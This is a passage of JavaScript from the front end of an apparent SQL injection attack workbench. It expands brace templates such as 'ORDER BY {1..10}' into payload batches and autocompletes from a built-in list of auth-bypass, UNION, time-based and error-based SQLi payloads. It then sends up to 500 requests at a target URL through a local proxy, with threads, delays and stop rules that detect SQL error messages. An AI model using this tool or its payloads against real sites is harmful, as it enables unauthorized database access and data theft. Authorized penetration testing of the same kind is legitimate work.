          return out;
        }
        // alpha range (single char)
        if (start.length === 1 && end.length === 1) {
          const out = [];
          const s = start.charCodeAt(0);
          const e = end.charCodeAt(0);
          const step = s <= e ? 1 : -1;
          for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
            out.push(String.fromCharCode(i));
          }
          return out;
        }
      }
      // comma list {1,2,3}
      return seg.split(',').map(x => x.trim()).filter(Boolean);
    }

    function expandBraces(str) {
      const re = /\{([^{}]+)\}/;
      if (!re.test(str)) return [str];
      const results = [str];
      let safety = 0;
      while (safety++ < 20) {
        let expanded = false;
        const next = [];
        for (const item of results) {
          const m = item.match(re);
          if (!m) { next.push(item); continue; }
          expanded = true;
          const variants = expandBraceSegment(m[1]);
          for (const v of variants) {
            next.push(item.slice(0, m.index) + v + item.slice(m.index + m[0].length));
          }
        }
        results.length = 0;
        results.push(...next);
        if (!expanded) break;
      }
      return results;
    }

    function expandAllPayloads() {
      const lines = (payloadInput.value || '').split('\n').filter(l => l.trim() !== '');
      if (lines.length === 0) return [];
      // If any line has braces → batch mode: expand each line, flatten
      const hasBrace = lines.some(l => /\{[^{}]+\}/.test(l));
      if (!hasBrace) return lines.map(l => ({ text: l, isBatch: false }));
      const out = [];
      for (const line of lines) {
        const expanded = expandBraces(line);
        for (const e of expanded) out.push({ text: e, isBatch: true, template: line });
      }
      return out;
    }

    function detectAttackMode() {
      const payloads = expandAllPayloads();
      const isBatch = payloads.length > 1 && payloads.some(p => p.isBatch);
      return { isBatch, payloads };
    }

    // ===== Autocomplete =====
    const AC_SUGGESTIONS = [
      { t: "ORDER BY {1..10}", h: "column count" },
      { t: "ORDER BY {1..20}-- -", h: "column count" },
      { t: "UNION SELECT {1..5}", h: "union cols" },
      { t: "UNION SELECT {1..10}-- -", h: "union cols" },
      { t: "UNION SELECT NULL{,NULL}", h: "null cols" },
      { t: "' OR '1'='1", h: "auth bypass" },
      { t: "' OR 1=1-- -", h: "auth bypass" },
      { t: "' OR 1=1#", h: "auth bypass" },
      { t: "admin'--", h: "auth bypass" },
      { t: "AND SLEEP(5)-- -", h: "time-based" },
      { t: "AND IF(1=1,SLEEP(5),0)-- -", h: "time-based" },
      { t: "; WAITFOR DELAY '0:0:5'--", h: "MSSQL time" },
      { t: "AND EXTRACTVALUE(1,CONCAT(0x7e,version()))", h: "error-based" },
      { t: "AND UPDATEXML(1,CONCAT(0x7e,database()),1)", h: "error-based" },
      { t: "UNION SELECT 1,2,database()-- -", h: "enum db" },
      { t: "UNION SELECT 1,2,version()-- -", h: "enum ver" },
      { t: "UNION SELECT 1,table_name,3 FROM information_schema.tables-- -", h: "tables" },
      { t: "AND 1=1-- -", h: "boolean true" },
      { t: "AND 1=2-- -", h: "boolean false" },
      { t: "{1..10}", h: "range expand" },
      { t: "{1,2,3,4,5}", h: "list expand" },
      { t: "{a..z}", h: "alpha expand" },
    ];

    const autocompleteBox = $('#autocompleteBox');
    let acIndex = -1;
    let acItems = [];

    function getCurrentWord() {
      const val = payloadInput.value;
      const pos = payloadInput.selectionStart;
      // word from start of current line to cursor
      const lineStart = val.lastIndexOf('\n', pos - 1) + 1;
      const partial = val.slice(lineStart, pos);
      return { partial, lineStart, pos };
    }

    function showAutocomplete() {
      const { partial } = getCurrentWord();
      const q = partial.trim().toUpperCase();
      if (q.length < 1) { autocompleteBox.classList.add('hidden'); return; }
      acItems = AC_SUGGESTIONS.filter(s =>
        s.t.toUpperCase().includes(q) || s.h.toUpperCase().includes(q)
      ).slice(0, 8);
      if (acItems.length === 0) { autocompleteBox.classList.add('hidden'); return; }
      acIndex = 0;
      autocompleteBox.innerHTML = acItems.map((s, i) =>
        `<div class="ac-item ${i === 0 ? 'active' : ''}" data-idx="${i}">
          ${escapeHtml(s.t)}<span class="ac-hint">${escapeHtml(s.h)}</span>
        </div>`
      ).join('');
      autocompleteBox.classList.remove('hidden');
      autocompleteBox.querySelectorAll('.ac-item').forEach(el => {
        el.addEventListener('mousedown', (e) => {
          e.preventDefault();
          applyAutocomplete(+el.dataset.idx);
        });
      });
    }

    function applyAutocomplete(idx) {
      const item = acItems[idx];
      if (!item) return;
      const { lineStart, pos } = getCurrentWord();
      const val = payloadInput.value;
      const lineEnd = val.indexOf('\n', pos);
      const end = lineEnd === -1 ? val.length : lineEnd;
      payloadInput.value = val.slice(0, lineStart) + item.t + val.slice(end);
      const newPos = lineStart + item.t.length;
      payloadInput.setSelectionRange(newPos, newPos);
      payloadInput.focus();
      autocompleteBox.classList.add('hidden');
      refreshAttackPanel();
    }

    payloadInput.addEventListener('input', () => {
      showAutocomplete();
      refreshAttackPanel();
    });
    payloadInput.addEventListener('keydown', (e) => {
      if (autocompleteBox.classList.contains('hidden')) return;
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        acIndex = Math.min(acIndex + 1, acItems.length - 1);
        autocompleteBox.querySelectorAll('.ac-item').forEach((el, i) => el.classList.toggle('active', i === acIndex));
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        acIndex = Math.max(acIndex - 1, 0);
        autocompleteBox.querySelectorAll('.ac-item').forEach((el, i) => el.classList.toggle('active', i === acIndex));
      } else if (e.key === 'Enter' || e.key === 'Tab') {
        if (acIndex >= 0 && acItems[acIndex]) {
          e.preventDefault();
          applyAutocomplete(acIndex);
        }
      } else if (e.key === 'Escape') {
        autocompleteBox.classList.add('hidden');
      }
    });
    payloadInput.addEventListener('blur', () => {
      setTimeout(() => autocompleteBox.classList.add('hidden'), 150);
    });

    // ===== Attack Panel =====
    const attackConfigPanel = $('#attackConfigPanel');
    const attackExpandCount = $('#attackExpandCount');
    const attackPreview = $('#attackPreview');
    const urlProgressBar = $('#urlProgressBar');
    const pauseBtn = $('#pauseBtn');
    const stopBtn = $('#stopBtn');
    const attackProgressLabel = $('#attackProgressLabel');

    function refreshAttackPanel() {
      const { isBatch, payloads } = detectAttackMode();
      if (isBatch) {
        attackConfigPanel.classList.remove('hidden');
        attackExpandCount.textContent = `${payloads.length} payloads`;
        const preview = payloads.slice(0, 12).map(p => `<span>${escapeHtml(p.text.slice(0, 40))}</span>`).join('');
        attackPreview.innerHTML = preview + (payloads.length > 12 ? `<span>+${payloads.length - 12} more</span>` : '');
        sendBtn.querySelector('.btn-text').textContent = 'Start SQLi ATK';
        sendBtn.classList.add('attack-mode');
      } else {
        attackConfigPanel.classList.add('hidden');
        sendBtn.querySelector('.btn-text').textContent = 'Send Request';
        sendBtn.classList.remove('attack-mode');
      }
    }

    function setProgress(done, total) {
      const pct = total ? Math.round((done / total) * 100) : 0;
      urlProgressBar.style.width = pct + '%';
      urlProgressBar.classList.toggle('active', total > 0 && done < total);
      if (done >= total && total > 0) {
        // brief full glow then settle
        urlProgressBar.classList.remove('active');
      }
      attackProgressLabel.textContent = `${done}/${total} (${pct}%)`;
      attackProgressLabel.classList.toggle('hidden', total === 0);
    }

    function setAttackControls(running) {
      pauseBtn.classList.toggle('hidden', !running);
      stopBtn.classList.toggle('hidden', !running);
      if (!running) {
        urlProgressBar.style.width = '0%';
        urlProgressBar.classList.remove('active');
        attackProgressLabel.classList.add('hidden');
        pauseBtn.textContent = 'Pause';
        state.attack.paused = false;
        state.attack.stop = false;
        state.attack.active = false;
      } else {
        urlProgressBar.classList.add('active');
      }
    }

    pauseBtn.addEventListener('click', () => {
      if (!state.attack.active) return;
      state.attack.paused = !state.attack.paused;
      pauseBtn.textContent = state.attack.paused ? 'Resume' : 'Pause';
      showToast(state.attack.paused ? 'Attack paused' : 'Attack resumed');
    });
    stopBtn.addEventListener('click', () => {
      if (!state.attack.active) return;
      state.attack.stop = true;
      state.attack.paused = false;
      showToast('Stopping attack…');
    });

    // ===== Send / Attack =====
    function applyPayloadPlaceholders(str, linesOverride) {
      if (!str || !str.includes('$')) return str;
      const lines = linesOverride || (payloadInput.value || '').split('\n');
      return str.replace(/\$(\d+)/g, (match, num) => {
        const idx = parseInt(num, 10) - 1;
        if (idx >= 0 && idx < lines.length) return lines[idx];
        return match;
      });
    }

    function applySinglePayload(str, payloadText) {
      // Replace $1 with this payload (and leave other $N if present using workbench lines)
      if (!str) return str;
      const lines = (payloadInput.value || '').split('\n');
      return str.replace(/\$(\d+)/g, (match, num) => {
        const idx = parseInt(num, 10) - 1;
        if (idx === 0) return payloadText;
        if (idx >= 0 && idx < lines.length) {
          // For $2+ use first expanded variant of that line or raw line
          const expanded = expandBraces(lines[idx]);
          return expanded[0] || lines[idx];
        }
        return match;
      });
    }

    async function executeOneRequest(url, method, postBody, customHeaders, payloadText, batchId, batchName, attackIndex) {
      const body = { url, method, headers: customHeaders };
      if (['POST', 'PUT', 'PATCH'].includes(method)) {
        body.post_data = postBody || '';
      }
      let respData = null;
      try {
        const apiBase = (window.location.port === '5000') ? '' : 'http://127.0.0.1:5000';
        const res = await fetch(`${apiBase}/api/send-payload`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        });
        const data = await res.json();
        if (!res.ok || data.error) {
          respData = {
            status: data.status_code || 0,
            statusText: data.error || res.statusText || 'Error',
            timeMs: data.response_time_ms || 0,
            headers: data.headers || {},
            body: data.raw_body || data.error || 'Request failed',
            fixedHtml: null,
          };
        } else {
          respData = {
            status: data.status_code,
            statusText: data.status_text || '',
            timeMs: data.response_time_ms || 0,
            headers: data.headers || {},
            body: data.raw_body || '',
            fixedHtml: data.fixed_html || data.raw_body || '',
            finalUrl: data.final_url || url,
          };
        }
      } catch (err) {
        respData = {
          status: 0,
          statusText: 'Proxy Unreachable',
          timeMs: 0,
          headers: {},
          body: String(err),
          fixedHtml: null,
        };
      }

      const entry = {
        id: state.nextId++,
        name: null,
        method,
        url,
        originalUrl: urlInput.value.trim(),
        payload: payloadText,
        postBody: postBody || '',
        headers: { ...customHeaders },
        response: respData,
        pinned: false,
        timestamp: Date.now(),
        batchId: batchId || null,
        batchName: batchName || null,
        attackIndex: attackIndex != null ? attackIndex : null,
        note: '',
      };
      state.history.push(entry);

      // Discover endpoints while recording (manual Send / attack too)
      if (state.recording) {
        recordEndpoint(url, method, postBody);
      }

      return entry;
    }

    function shouldStopAttack(entry, stopOn, baselineSize) {
      if (stopOn === 'none') return false;
      if (stopOn === '2xx' && entry.response.status >= 200 && entry.response.status < 300) return true;
      if (stopOn === 'diff' && baselineSize != null) {
        const sz = (entry.response.body || '').length;
        if (Math.abs(sz - baselineSize) > 50) return true;
      }
      if (stopOn === 'error') {
        const body = (entry.response.body || '').toLowerCase();
        if (/sql syntax|mysql|odbc|ora-\d|postgresql|sqlite|unclosed quotation|sqlstate/i.test(body)) return true;
        if (entry.response.status >= 500) return true;
      }
      return false;
    }

    async function runAttack(payloads) {
      // Custom modal instead of browser prompt
      const defaultName = 'Attack ' + new Date().toLocaleTimeString();
      const meta = await promptAttackMeta(defaultName);
      if (meta.cancelled) {
        showToast('Attack cancelled');
        return;
      }
      const attackName = meta.name || defaultName;
      const attackNote = meta.note || '';

      const method = methodSelect.value;
      const urlTemplate = urlInput.value.trim();
      let postBodyTemplate = postBodyInput ? postBodyInput.value : '';
      const customHeaders = buildRequestHeaders(postBodyTemplate);
      const threads = Math.max(1, Math.min(50, +($('#atkThreads')?.value || 3)));
      const delay = Math.max(0, +($('#atkDelay')?.value || 200));
      const stopOn = $('#atkStopOn')?.value || 'none';
      const batchId = 'atk-' + Date.now();

      state.attack = {
        active: true, paused: false, stop: false,
        total: payloads.length, done: 0, batchId, payloads, name: attackName, note: attackNote,
      };
      state.isSending = true;
      sendBtn.classList.add('loading');
      sendBtn.disabled = true;
      setAttackControls(true);
      setProgress(0, payloads.length);

      // Save full attack source so it can be restored later
      state.attackSources[batchId] = {
        name: attackName,
        note: attackNote,
        urlTemplate,
        payloadText: payloadInput.value,
        method,
        postBody: postBodyTemplate,
        headers: state.headers.map(h => ({ ...h })),
        atkConfig: {
          threads,
          delay,
          timeout: +($('#atkTimeout')?.value || 15),
          stopOn,
        },
      };

      // Register filter option for this attack name
      ensureAttackFilterOption(batchId, attackName);
      state.historyStatusFilter = 'batch:' + batchId;
      if (historyStatusFilter) historyStatusFilter.value = 'batch:' + batchId;

      let baselineSize = null;
      let queue = payloads.map((p, i) => ({ ...p, attackIndex: i }));
      let running = 0;
      let stoppedEarly = false;

      await new Promise((resolve) => {
        const pump = async () => {
          if (state.attack.stop) { stoppedEarly = true; resolve(); return; }
          while (state.attack.paused && !state.attack.stop) {
            await new Promise(r => setTimeout(r, 100));
          }
          if (state.attack.stop) { stoppedEarly = true; resolve(); return; }
          if (queue.length === 0 && running === 0) { resolve(); return; }

          while (running < threads && queue.length > 0 && !state.attack.stop) {
            const p = queue.shift();
            running++;
            (async () => {
              const url = applySinglePayload(urlTemplate, p.text);
              const postBody = applySinglePayload(postBodyTemplate, p.text);
              const entry = await executeOneRequest(url, method, postBody, customHeaders, p.text, batchId, attackName, p.attackIndex);
              if (attackNote) entry.note = attackNote;
              state.attack.done++;
              setProgress(state.attack.done, state.attack.total);

              // Always update the latest into view (user can click older ones anytime)
              state.activeHistoryId = entry.id;
              displayResponse(entry.response, entry.url);
              renderHistory();

              if (baselineSize == null && entry.response.status > 0) {
                baselineSize = (entry.response.body || '').length;
              }
              if (shouldStopAttack(entry, stopOn, baselineSize)) {
                state.attack.stop = true;
                stoppedEarly = true;
                showToast(`Stop condition met on payload: ${p.text.slice(0, 40)}`);
              }

              if (delay > 0) await new Promise(r => setTimeout(r, delay));
              running--;
              pump();
            })();
          }
        };
        pump();
      });

      state.isSending = false;
      sendBtn.classList.remove('loading');
      sendBtn.disabled = false;
      setAttackControls(false);
      renderHistory();
      setPayloadCollapsed(true);
      showToast(
        stoppedEarly
          ? `Attack stopped — ${state.attack.done}/${state.attack.total}`
          : `Attack complete — ${state.attack.done}/${state.attack.total}`,
        'success'
      );
    }

    async function sendRequest() {
      if (state.attack.active) return;
      if (state.isSending) return;

      const url = urlInput.value.trim();
      if (!url) { showToast('Enter a target URL'); urlInput.focus(); return; }

      const { isBatch, payloads } = detectAttackMode();

      if (isBatch) {
        if (payloads.length > 500) {
          showToast(`Too many payloads (${payloads.length}). Max 500.`);
          return;
        }
        await runAttack(payloads);
        return;
      }

      // Single request
      state.isSending = true;
      sendBtn.classList.add('loading');
      sendBtn.disabled = true;

      const method = methodSelect.value;
      const payload = payloadInput.value.trim();
      let postBody = postBodyInput ? postBodyInput.value : '';

      const finalUrl = applyPayloadPlaceholders(url);
      postBody = applyPayloadPlaceholders(postBody);
      const customHeaders = buildRequestHeaders(postBody);

      const entry = await executeOneRequest(finalUrl, method, postBody, customHeaders, payload, null);
      state.activeHistoryId = entry.id;

      $$('.tab-btn').forEach(b => b.classList.remove('active'));
      $$('.tab-content').forEach(c => c.classList.remove('active'));
      const renderedTabBtn = document.querySelector('.tab-btn[data-tab="rendered"]');
      if (renderedTabBtn) renderedTabBtn.classList.add('active');
      const renderedTab = $('#tab-rendered');
      if (renderedTab) renderedTab.classList.add('active');
      activeTab = 'rendered';

      displayResponse(entry.response, finalUrl);
      renderHistory();

      state.isSending = false;
      sendBtn.classList.remove('loading');
      sendBtn.disabled = false;

      // Free vertical space for response analysis after send
      setPayloadCollapsed(true);

      if (entry.response.status > 0) {
        showToast(`#${entry.id} → ${entry.response.status} (${entry.response.timeMs}ms)`, 'success');
      }
    }

    sendBtn.addEventListener('click', sendRequest);
    document.addEventListener('keydown', (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        e.preventDefault();
        sendRequest();
      }
    });

    // ===== Init =====
    function init() {
      initAppearanceControls();
      // Night Protect defaults from localStorage
      npConfig = loadNpConfig();
      state.nightProtectMode = Math.max(0, Math.min(2, +npConfig.defaultMode || 0));
      state.nightProtect = state.nightProtectMode > 0;
      syncNpSettingsUI();
      bindNpSettingsUI();
      if (typeof syncNightProtectBtn === 'function') syncNightProtectBtn();

      renderShortcutsList();
      renderHeaders();
      renderCheatSheet();
      renderHfChips();
      renderHistory();
      urlInput.value = 'https://vulnerable.example.com/page.php?id=$1';
      payloadInput.value = '';
      refreshAttackPanel();
      // Show shortcut hints on nav buttons
      const hint = (id) => formatShortcut(shortcuts[id] || {});
      const np = $('#navPayloadBtn'); if (np) np.title = 'Payload (' + hint('openPayload') + ')';
      const nh = $('#navHistoryBtn'); if (nh) nh.title = 'History (' + hint('openHistory') + ')';
      const nc = $('#navCheatBtn'); if (nc) nc.title = 'Cheat Sheet (' + hint('openCheat') + ')';
      const ns = $('#navSettingsBtn'); if (ns) ns.title = 'Settings (' + hint('openSettings') + ')';
      setInterval(() => {
        if (state.history.length && !state.attack.active) renderHistory();
      }, 30000);
    }
    init();
